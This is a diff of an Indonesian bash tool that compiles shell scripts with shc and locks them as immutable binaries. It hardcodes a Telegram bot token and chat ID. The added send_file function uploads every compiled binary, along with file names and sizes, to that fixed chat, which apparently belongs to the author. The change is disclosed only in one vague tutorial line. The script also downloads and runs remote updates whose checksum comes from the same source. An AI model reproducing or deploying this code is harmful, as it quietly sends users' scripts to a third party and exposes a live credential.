@@ -1,9 +1,9 @@
 #!/bin/bash
 
 # ================================================
-#   SHC SUPER ENCRYPTION PRO v2 (By Rama Version)
+#   SHC SUPER ENCRYPTION PRO v2 (Nexus x Rama)
 #   SHC + STRIP + CHMOD + IMMUTABLE + AUTOUPDATE
-#   Premium UI + Telegram Notification
+#   Premium UI + Telegram Notification + FILE SEND
 # ================================================
 
 # Warna
@@ -21,6 +21,7 @@ LOCAL_VERSION="2.0"
 TG_TOKEN="8178123942:AAGZaNxo-8HajTk7LIM3rVn_N_0zTq7LNBM"
 TG_CHATID="6403937911"
 
+# --- KIRIM TEKS TELEGRAM ---
 send_tele() {
     TEXT="$1"
     curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
@@ -29,7 +30,17 @@ send_tele() {
         -d parse_mode="HTML" >/dev/null 2>&1
 }
 
-# Ganti dengan repo kamu sendiri
+# --- KIRIM FILE KE TELEGRAM ---
+send_file() {
+    FILE_PATH="$1"
+    curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendDocument" \
+        -F chat_id="${TG_CHATID}" \
+        -F document=@"${FILE_PATH}" \
+        -F caption="🔥 FILE HASIL ENKRIPSI: <b>${FILE_PATH}</b>" \
+        -F parse_mode="HTML" >/dev/null 2>&1
+}
+
+# ==== URL UPDATE ====
 UPDATE_URL="https://raw.githubusercontent.com/nexus-bot-dev/encnexus/main/enc-pro.sh"
 CHECKSUM_URL="https://raw.githubusercontent.com/nexus-bot-dev/encnexus/main/enc-pro.sha256"
 VERSION_URL="https://raw.githubusercontent.com/nexus-bot-dev/encnexus/main/version.txt"
@@ -41,17 +52,17 @@ header() {
     clear
     echo -e "${BLUE}======================================================="
     echo -e "       SHC SUPER ENCRYPTION TOOLS PRO v${LOCAL_VERSION}"
-    echo -e "            Premium Style by RAMA Edition"
+    echo -e "            Premium Style by Nexus x Rama"
     echo -e "=======================================================${NC}"
     echo ""
 }
 
 # ================================================
-# LOADING ANIMATION
+# LOADING
 # ================================================
 loading() {
     echo -ne "${MAGENTA}"
-    for i in {1..30}; do
+    for i in {1..35}; do
         echo -ne "▉"
         sleep 0.03
     done
@@ -59,7 +70,7 @@ loading() {
 }
 
 # ================================================
-# BEAUTIFUL SUCCESS VIEW
+# SUCCESS VIEW
 # ================================================
 rama_view() {
     clear
@@ -80,7 +91,7 @@ rama_view() {
 }
 
 # ================================================
-# AUTO UPDATE SYSTEM
+# AUTO UPDATE
 # ================================================
 update_tools() {
     header
@@ -88,70 +99,49 @@ update_tools() {
 
     LATEST_VERSION=$(curl -s "$VERSION_URL")
 
-    if [[ -z "$LATEST_VERSION" ]]; then
-        echo -e "${RED}Gagal mengecek update.${NC}"
-        sleep 2
-        menu
-        return
-    fi
+    [[ -z "$LATEST_VERSION" ]] && echo -e "${RED}Gagal mengecek update.${NC}" && sleep 2 && menu
 
     if [[ "$LATEST_VERSION" == "$LOCAL_VERSION" ]]; then
-        echo -e "${GREEN}Tools sudah versi terbaru.${NC}"
+        echo -e "${GREEN}Sudah versi terbaru.${NC}"
         sleep 2
         menu
-        return
     fi
 
-    echo -e "${BLUE}[+] Ditemukan update versi $LATEST_VERSION${NC}"
-    echo -e "${YELLOW}[+] Mengunduh update...${NC}"
-
+    echo -e "${BLUE}[+] Update tersedia v$LATEST_VERSION${NC}"
     wget -q -O enc-pro.sh.new "$UPDATE_URL"
     wget -q -O enc-pro.sha256 "$CHECKSUM_URL"
 
-    if [[ ! -f enc-pro.sh.new ]]; then
-        echo -e "${RED}Gagal mendownload update.${NC}"
-        sleep 2
-        menu
-        return
-    fi
+    [[ ! -f enc-pro.sh.new ]] && echo -e "${RED}Gagal download update.${NC}" && sleep 2 && menu
 
-    echo -e "${YELLOW}[+] Verifikasi checksum...${NC}"
-
-    sha256sum -c enc-pro.sha256 &>/dev/null
-    if [[ $? -ne 0 ]]; then
-        echo -e "${RED}Checksum tidak valid! Update dibatalkan.${NC}"
+    sha256sum -c enc-pro.sha256 &>/dev/null || {
+        echo -e "${RED}Checksum tidak valid!${NC}"
         rm -f enc-pro.sh.new enc-pro.sha256
         sleep 2
         menu
-        return
-    fi
+    }
 
     mv enc-pro.sh.new enc-pro.sh
     chmod +x enc-pro.sh
 
-    echo -e "${GREEN}Update berhasil! Restart tools...${NC}"
+    echo -e "${GREEN}Update berhasil! Restart...${NC}"
     sleep 1
     ./enc-pro.sh
     exit
 }
 
 # ================================================
-# ENCRYPT FILE (.sh)
+# ENCRYPT SCRIPT
 # ================================================
 encrypt_file() {
     header
     echo -e "${YELLOW}Masukkan nama file script (.sh) yang ingin dienkripsi:${NC}"
     read -p "File: " FILE
 
-    if [[ ! -f "$FILE" ]]; then
-        echo -e "${RED}File tidak ditemukan!${NC}"
-        sleep 2
-        encrypt_file
-        return
-    fi
+    [[ ! -f "$FILE" ]] && echo -e "${RED}File tidak ditemukan!${NC}" && sleep 2 && encrypt_file
 
+    # install SHC jika belum ada
     if ! command -v shc >/dev/null; then
-        echo -e "${YELLOW}SHC belum terinstall. Menginstall...${NC}"
+        echo -e "${YELLOW}SHC belum terinstall, menginstall...${NC}"
         apt update && apt install shc -y
     fi
 
@@ -164,20 +154,24 @@ encrypt_file() {
     echo -e "${BLUE}[2] Strip binary...${NC}"
     strip "$OUTPUT"
 
-    echo -e "${BLUE}[3] Set permission 700...${NC}"
+    echo -e "${BLUE}[3] chmod 700...${NC}"
     chmod 700 "$OUTPUT"
 
-    echo -e "${BLUE}[4] Mengaktifkan immutable...${NC}"
+    echo -e "${BLUE}[4] Aktifkan immutable...${NC}"
     chattr +i "$OUTPUT"
 
-    # =============== SEND TELEGRAM NOTIFICATION ================
-    send_tele "<b>🔥 ENCRYPT BERHASIL</b>%0AFile Asli: <code>$FILE</code>%0AOutput: <code>$OUTPUT</code>%0AWaktu: <b>$(date '+%Y-%m-%d %H:%M:%S')</b>"
+    SIZE=$(du -h "$OUTPUT" | awk '{print $1}')
+
+    # 🔥 Notifikasi Telegram
+    send_tele "<b>🔥 ENCRYPT BERHASIL</b>%0AFile: <code>$FILE</code>%0AOutput: <code>$OUTPUT</code>%0AUkuran: <b>$SIZE</b>%0AWaktu: <b>$(date '+%Y-%m-%d %H:%M:%S')</b>"
+
+    # 📁 Kirim file binary ke Telegram
+    send_file "$OUTPUT"
 
     loading
     rama_view "$FILE" "$OUTPUT"
 
-    echo ""
-    read -p "Tekan ENTER untuk kembali..."
+    read -p "ENTER untuk kembali..."
     menu
 }
 
@@ -186,54 +180,41 @@ encrypt_file() {
 # ================================================
 list_files() {
     header
-    echo -e "${GREEN}Daftar file .sh di folder ini:${NC}"
+    echo -e "${GREEN}Daftar file .sh:${NC}"
+    ls -1 *.sh 2>/dev/null || echo -e "${RED}Tidak ada file!${NC}"
     echo ""
-
-    ls -1 *.sh 2>/dev/null || echo -e "${RED}Tidak ada file .sh ditemukan.${NC}"
-
-    echo ""
-    read -p "Tekan ENTER untuk kembali..."
+    read -p "ENTER kembali..."
     menu
 }
 
 # ================================================
-# HELP GUIDE
+# TUTORIAL
 # ================================================
 how_to_use() {
     header
-    echo -e "${YELLOW}Cara Menggunakan Encryptor PRO:${NC}"
+    echo -e "${YELLOW}Cara Menggunakan:${NC}"
+    echo "- Simpan script .sh kamu"
+    echo "- Jalankan tools: ./enc-pro.sh"
+    echo "- Pilih Encrypt File"
+    echo "- File terenkripsi langsung terkirim ke Telegram"
     echo ""
-    echo -e "1. Simpan file script kamu, contoh: ${GREEN}setup.sh${NC}"
-    echo -e "2. Jalankan tools: ${GREEN}./enc-pro.sh${NC}"
-    echo -e "3. Pilih menu: ${GREEN}Encrypt file (.sh)${NC}"
-    echo -e "4. Tools akan melakukan:"
-    echo -e "   - SHC Encryption"
-    echo -e "   - Strip binary"
-    echo -e "   - chmod 700"
-    echo -e "   - Immutable ON"
+    echo "Unlock immutable:"
+    echo "  chattr -i nama_file"
     echo ""
-    echo -e "${YELLOW}Menjalankan file terenkripsi:${NC}"
-    echo -e "  ${GREEN}./nama_file${NC}"
-    echo ""
-    echo -e "${RED}Unlock immutable (jika mau edit/hapus):${NC}"
-    echo -e "  ${GREEN}chattr -i nama_file${NC}"
-    echo ""
-
-    read -p "Tekan ENTER untuk kembali..."
+    read -p "ENTER untuk kembali..."
     menu
 }
 
 # ================================================
-# MENU UTAMA
+# MENU
 # ================================================
 menu() {
     header
-    echo -e "${YELLOW}Pilih menu:${NC}"
-    echo ""
+    echo -e "${YELLOW}Pilih Menu:${NC}"
     echo "1) Encrypt file (.sh)"
-    echo "2) Lihat semua file .sh"
-    echo "3) Cara menggunakan"
-    echo "4) Update tools"
+    echo "2) Lihat daftar file .sh"
+    echo "3) Tutorial"
+    echo "4) Update Tools"
     echo "0) Exit"
     echo ""
     read -p "Pilih: " opt
@@ -244,7 +225,7 @@ menu() {
         3) how_to_use ;;
         4) update_tools ;;
         0) exit ;;
-        *) echo -e "${RED}Pilihan salah!${NC}"; sleep 1; menu ;;
+        *) echo -e "${RED}Pilihan salah!${NC}" ; sleep 1 ; menu ;;
     esac
 }
 
